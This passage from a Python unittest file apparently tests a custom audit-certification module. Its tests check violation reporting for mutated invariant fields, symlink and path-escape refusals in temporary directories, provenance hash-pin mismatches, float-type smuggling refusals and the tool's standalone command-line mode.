        assert_refused(lambda p, i: rt(i).__setitem__("final_committed_weights", ["99/1", "-7/1"]), "rt-trace-count-match")
        assert_refused(lambda p, i: rt(i).__setitem__("final_best_behavior", "1/1"), "rt-trace-count-match")
        assert_refused(lambda p, i: cg(i).__setitem__("radius_sq", "0/1"), "cg-nonneg-drifts")
        assert_refused(lambda p, i: cg(i).__setitem__("flip_drift_sq", "-1/1"), "cg-nonneg-drifts")
        assert_refused(lambda p, i: cg(i).__setitem__("perm_drift_sq", "-1/1"), "cg-nonneg-drifts")
        assert_refused(lambda p, i: cg(i).__setitem__("perm_norm_only_falsely_rejects", False), "cg-proved-match")
        assert_refused(lambda p, i: cg(i).__setitem__("flip_norm_only_falsely_accepts", False), "cg-proved-match")
        assert_refused(lambda p, i: cg(i).__setitem__("flip_r2_dec4", "-3.0000"), "cg-proved-match")
        assert_refused(lambda p, i: cg(i).__setitem__("drift_ratio_perm_over_flip", "9/1"), "cg-proved-match")
        assert_refused(lambda p, i: cg(i).__setitem__("calibration_gap_proved", False), "cg-proved-match")

        # Invariant C exact-key & violation allowlist refusals
        assert_refused(lambda p, i: i.__setitem__("invariant_c_splicer_protocol", "bad"), "inv_c-keys-exact")
        assert_refused(lambda p, i: i["invariant_c_splicer_protocol"].__setitem__("extra", 1), "inv_c-keys-exact")
        assert_refused(lambda p, i: i["invariant_c_splicer_protocol"].__setitem__("compliant_graft_witness", "bad"), "inv_c-subdicts")
        assert_refused(lambda p, i: i["invariant_c_splicer_protocol"]["compliant_graft_witness"].__setitem__("extra", 1), "inv_c-subdicts")
        assert_refused(lambda p, i: i["invariant_c_splicer_protocol"].__setitem__("adversarial_violation_witness", "bad"), "inv_c-subdicts")
        assert_refused(lambda p, i: i["invariant_c_splicer_protocol"]["adversarial_violation_witness"].__setitem__("extra", 1), "inv_c-subdicts")
        sp_ok = lambda i: i["invariant_c_splicer_protocol"]["compliant_graft_witness"]
        sp_bad = lambda i: i["invariant_c_splicer_protocol"]["adversarial_violation_witness"]
        assert_refused(lambda p, i: sp_ok(i).__setitem__("non_vendor_host_files_touched", 0), "sp-ok-touch-bounds")
        assert_refused(lambda p, i: sp_ok(i).__setitem__("non_vendor_host_files_touched", 3), "sp-ok-touch-bounds")
        assert_refused(lambda p, i: sp_ok(i).__setitem__("violations", ["x"]), "sp-ok-empty-violations")
        assert_refused(lambda p, i: sp_ok(i).__setitem__("airlock_boundary", "UNBLINDED"), "sp-ok-empty-violations")
        assert_refused(lambda p, i: sp_ok(i).__setitem__("airlock_leaked_fields", ["author_identity"]), "sp-ok-empty-violations")
        assert_refused(lambda p, i: sp_ok(i).__setitem__("verifier_blinded_from_zone_a", False), "sp-ok-empty-violations")
        assert_refused(lambda p, i: sp_bad(i).__setitem__("violations", "bad"), "sp-bad-violations-list")
        assert_refused(lambda p, i: sp_bad(i).__setitem__("violations", [1, 2, 3, 4, 5]), "clean-ascii:sp_bad.violations")
        assert_refused(lambda p, i: sp_bad(i).__setitem__("violations", ["FORGED_CODE"]), "sp-bad-violations-codes")
        assert_refused(
            lambda p, i: sp_bad(i).__setitem__("violations", ["CLEAN_EJECTION_FAILED", "CLEAN_EJECTION_FAILED"]),
            "sp-bad-violations-codes",
        )

        # EVERY individual violation factor flipped in isolation (using valid formula-consistent values!)
        p1, i1 = _valid_cert_inputs()
        i1["reply91_decay_refutation"].update({
            "calm_tension": "1/1", "eps": "1/1", "d5_reply91_pressure": "3/40",
            "d5_reply91_multiplier": "3997/4000", "d5_reply91_multiplier_dec4": "0.9992",
            "d5_reply91_sign_flip_blowup": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p1, i1)["violations"], ["REPLY91_DECAY_REFUTATION_INCOMPLETE"])

        p1b, i1b = _valid_cert_inputs()
        i1b["reply91_decay_refutation"].update({"law2b_bounded_mult_at_peak": "2/1", "law2b_strictly_stable": False})
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p1b, i1b)["violations"], ["REPLY91_DECAY_REFUTATION_INCOMPLETE"])

        p1c, i1c = _valid_cert_inputs()
        i1c["reply91_decay_refutation"].update({
            "base_decay": "1/1", "d5_reply91_pressure": "100001/1",
            "d5_reply91_multiplier": "-99901/100", "d5_reply91_multiplier_dec4": "-999.0100",
            "law2b_bounded_mult_at_calm": "0/1", "law2b_strictly_stable": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p1c, i1c)["violations"], ["REPLY91_DECAY_REFUTATION_INCOMPLETE"])

        p2, i2 = _valid_cert_inputs()
        i2["invariant_a_anti_homogenization"]["diverse_with_rogue_outlier_blocked"].update({"gate_passed": False, "selected_candidate_id": None})
        g_a1 = oracle.certify_siliconcordat_d5_audit(p2, i2)
        self.assertEqual(g_a1["violations"], ["INVARIANT_A_CONTROLS_FAILED"])
        self.assertFalse(g_a1["invariant_a_ok"])

        p2b, i2b = _valid_cert_inputs()
        i2b["invariant_a_anti_homogenization"]["monoculture_echo_chamber_vetoed"].update({"gate_passed": True})
        g_a2 = oracle.certify_siliconcordat_d5_audit(p2b, i2b)
        self.assertEqual(g_a2["violations"], ["INVARIANT_A_CONTROLS_FAILED"])
        self.assertFalse(g_a2["invariant_a_ok"])

        # Calibration-gap individual conjunct flips (expected_pfr / expected_ffa)
        p_cg1, i_cg1 = _valid_cert_inputs()
        i_cg1["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "perm_r2": "1/2", "perm_norm_only_falsely_rejects": False, "calibration_gap_proved": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p_cg1, i_cg1)["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

        p_cg2, i_cg2 = _valid_cert_inputs()
        i_cg2["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "flip_r2": "0/1", "flip_r2_dec4": "0.0000", "flip_norm_only_falsely_accepts": False, "calibration_gap_proved": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p_cg2, i_cg2)["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

        # Invariant C individual conjunct flips: sp_ok_c=False, sp_bad_c=True, len(violations)<5
        p3a, i3a = _valid_cert_inputs()
        i3a["invariant_c_splicer_protocol"]["compliant_graft_witness"]["compliant"] = False
        g_c1 = oracle.certify_siliconcordat_d5_audit(p3a, i3a)
        self.assertEqual(g_c1["violations"], ["INVARIANT_C_CONTROLS_FAILED"])
        self.assertFalse(g_c1["invariant_c_ok"])

        p3b, i3b = _valid_cert_inputs()
        i3b["invariant_c_splicer_protocol"]["adversarial_violation_witness"]["compliant"] = True
        g_c2 = oracle.certify_siliconcordat_d5_audit(p3b, i3b)
        self.assertEqual(g_c2["violations"], ["INVARIANT_C_CONTROLS_FAILED"])
        self.assertFalse(g_c2["invariant_c_ok"])

        p3c, i3c = _valid_cert_inputs()
        i3c["invariant_c_splicer_protocol"]["adversarial_violation_witness"]["violations"] = ["UNMAPPED_FOREIGN_DEPENDENCY"]
        g_c3 = oracle.certify_siliconcordat_d5_audit(p3c, i3c)
        self.assertEqual(g_c3["violations"], ["INVARIANT_C_CONTROLS_FAILED"])
        self.assertFalse(g_c3["invariant_c_ok"])


class TestAuditProvenanceAndCliR5(unittest.TestCase):
    """Kill EVERY single provenance, symlink, pin, envelope, and CLI mutant in audit."""

    def test_containment_and_provenance_refusals(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            base = Path(td)
            outside = base / "outside"
            outside.mkdir()
            (outside / "f.txt").write_text("ok", encoding="utf-8")
            root = base / "root"
            root.mkdir()
            inside = root / "real.txt"
            inside.write_text("ok", encoding="utf-8")

            # Direct symlink pointing INSIDE root -> kills not child.is_symlink()
            link_in = root / "link.txt"
            link_in.symlink_to(inside)
            with self.assertRaisesRegex(CordatAuditError, "symlink-refused"):
                audit._require_contained_file(root, link_in, "link")

            # Parent symlink escape where leaf is not a symlink -> kills is_relative_to
            (root / "via").symlink_to(outside)
            with self.assertRaisesRegex(CordatAuditError, "escape-refused"):
                audit._require_contained_file(root, root / "via" / "f.txt", "escape")

            # Non-file inside root -> kills is_file()
            with self.assertRaisesRegex(CordatAuditError, "file-missing"):
                audit._require_contained_file(root, root / "missing.txt", "missing")

            # verify_portal_provenance: bad expected_pins shape/keys, nonexistent root, symlinked root, and all 4 pin mismatches
            with self.assertRaisesRegex(CordatAuditError, "pins-keys-exact"):
                audit.verify_portal_provenance(base / "nope", expected_pins="bad")  # type: ignore[arg-type]
            with self.assertRaisesRegex(CordatAuditError, "pins-keys-exact"):
                audit.verify_portal_provenance(base / "nope", expected_pins={})
            with self.assertRaisesRegex(CordatAuditError, "intake-root-missing"):
                audit.verify_portal_provenance(base / "nope")

            portal_dir = base / "portal"
            pins = _write_mini_portal(portal_dir)
            prov, _, _ = audit.verify_portal_provenance(portal_dir, expected_pins=pins)
            self.assertTrue(prov["pinned_inputs_verified"])

            sym_portal = base / "portal_link"
            sym_portal.symlink_to(portal_dir)
            with self.assertRaisesRegex(CordatAuditError, "intake-root-missing"):
                audit.verify_portal_provenance(sym_portal, expected_pins=pins)

            for key, bad_val, err in (
                ("discussion_5_raw_json_bytes", 1, "pin-mismatch:raw_json_bytes"),
                ("discussion_5_raw_json_sha256", "0" * 64, "pin-mismatch:raw_json_sha256"),
                ("discussion_5_full_md_bytes", 1, "pin-mismatch:full_md_bytes"),
                ("discussion_5_full_md_sha256", "0" * 64, "pin-mismatch:full_md_sha256"),
            ):
                bad_pins = dict(pins)
                bad_pins[key] = bad_val
                with self.assertRaisesRegex(CordatAuditError, err):
                    audit.verify_portal_provenance(portal_dir, expected_pins=bad_pins)

    def test_assemble_standalone_and_cli(self) -> None:
        p, inv = _valid_cert_inputs()
        gate = oracle.certify_siliconcordat_d5_audit(p, inv)
        prov = {"pinned_inputs_verified": False}

        # _strict_typed_equal unit checks (kills every branch & conjunct)
        self.assertTrue(audit._strict_typed_equal(True, True))
        self.assertFalse(audit._strict_typed_equal(True, 1))
        self.assertTrue(audit._strict_typed_equal(1, 1))
        self.assertFalse(audit._strict_typed_equal(1, 2))
        self.assertFalse(audit._strict_typed_equal({"a": True}, {"a": 1}))
        self.assertFalse(audit._strict_typed_equal({"a": 1}, {"a": 1, "b": 2}))
        self.assertFalse(audit._strict_typed_equal({"a": 1}, {"b": 1}))
        self.assertFalse(audit._strict_typed_equal([True], [1]))
        self.assertFalse(audit._strict_typed_equal([1], [1, 2]))
        self.assertTrue(audit._strict_typed_equal((True,), (True,)))
        self.assertFalse(audit._strict_typed_equal((True,), (1,)))

        with self.assertRaisesRegex(CordatAuditError, "invalid-exec-mode"):
            audit.assemble_certificate(p, inv, gate, prov, "bad", False)
        with self.assertRaisesRegex(CordatAuditError, "live-flag-bool"):
            audit.assemble_certificate(p, inv, gate, prov, "standalone_fixture_replay", 0)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "live-flag-mode-mismatch"):
            audit.assemble_certificate(p, inv, gate, prov, "standalone_fixture_replay", True)
        with self.assertRaisesRegex(CordatAuditError, "live-flag-mode-mismatch"):
            audit.assemble_certificate(p, inv, gate, prov, "live_portal_recount", False)
        with self.assertRaisesRegex(CordatAuditError, "provenance-live-mismatch"):
            audit.assemble_certificate(p, inv, gate, "bad", "standalone_fixture_replay", False)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "provenance-live-mismatch"):
            audit.assemble_certificate(p, inv, gate, {"pinned_inputs_verified": 0}, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "provenance-live-mismatch"):
            audit.assemble_certificate(p, inv, gate, {"pinned_inputs_verified": True}, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "provenance-live-mismatch"):
            audit.assemble_certificate(p, inv, gate, {"pinned_inputs_verified": False}, "live_portal_recount", True)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p, inv, "bad", prov, "standalone_fixture_replay", False)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p, inv, dict(gate, certified=False), prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p, inv, dict(gate, certified=1), prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p, inv, dict(gate, portal_conservation_ok=1), prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p, inv, dict(gate, invariant_a_ok=1), prov, "standalone_fixture_replay", False)
        # Re-certifies live: passing matching uncertified gate or forged certified gate on bad invariants is refused!
        p_bad, inv_bad = _valid_cert_inputs()
        inv_bad["invariant_c_splicer_protocol"]["compliant_graft_witness"]["compliant"] = False
        uncert_gate = oracle.certify_siliconcordat_d5_audit(p_bad, inv_bad)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p_bad, inv_bad, uncert_gate, prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "audit-gate-not-certified"):
            audit.assemble_certificate(p_bad, inv_bad, gate, prov, "standalone_fixture_replay", False)
        # Float smuggling into portal/invariants/audit_gate/provenance refused!
        flt = _make_float()
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden:portal"):
            audit.assemble_certificate(dict(p, extra_flt=flt), inv, gate, prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden:invariants"):
            audit.assemble_certificate(p, dict(inv, extra_flt=flt), gate, prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden:audit_gate"):
            audit.assemble_certificate(p, inv, dict(gate, extra_flt=flt), prov, "standalone_fixture_replay", False)
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden:provenance"):
            audit.assemble_certificate(p, inv, gate, dict(prov, extra_flt=flt), "standalone_fixture_replay", False)

        std = audit.run_standalone_replay()
        self.assertEqual(std["execution_mode"], "standalone_fixture_replay")
        self.assertFalse(std["live_portal_recounted"])

        buf_j = io.StringIO()
        with redirect_stdout(buf_j):
            self.assertEqual(audit.main(["--standalone", "--json"]), 0)
        self.assertEqual(json.loads(buf_j.getvalue())["certificate_sha256"], std["certificate_sha256"])

        buf_h = io.StringIO()
        with redirect_stdout(buf_h):
            self.assertEqual(audit.main(["--standalone"]), 0)
        self.assertIn("standalone_fixture_replay", buf_h.getvalue())

        with tempfile.TemporaryDirectory() as td:
            out_p = Path(td) / "c.json"
            with redirect_stdout(io.StringIO()):
                self.assertEqual(audit.main(["--standalone", "--write-cert", str(out_p)]), 0)
            self.assertEqual(json.loads(out_p.read_text(encoding="utf-8")), std)


if __name__ == "__main__":
    unittest.main(verbosity=2)
